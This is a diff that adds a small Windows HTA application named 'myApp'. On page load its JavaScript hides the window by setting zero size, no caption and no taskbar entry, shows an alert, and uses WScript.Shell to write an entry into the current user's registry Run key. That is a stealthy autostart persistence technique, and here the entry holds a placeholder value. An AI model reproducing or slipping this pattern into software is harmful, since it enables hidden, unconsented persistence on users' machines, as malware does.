@@ -1,0 +1,32 @@
+<html>
+<head>
+    <HTA:APPLICATION ID="xHTA"
+        APPLICATIONNAME="myApp"
+        WINDOWSTATE="normal"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        >
+<script language="JavaScript">
+function writeInRegistry(sRegEntry, sRegValue)
+{
+    var regpath = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + sRegEntry;
+    var oWSS = new ActiveXObject("WScript.Shell");
+    oWSS.RegWrite(regpath, sRegValue, "REG_SZ");
+}
+
+function tst()
+{
+    window.resizeTo(0, 0)
+    alert("I am an alert box!");
+    writeInRegistry("huyhv9", "huyhoi");
+}
+</script>
+</head>
+<body>
+    <script>
+        tst()
+    </script>
+</body>
+</html>
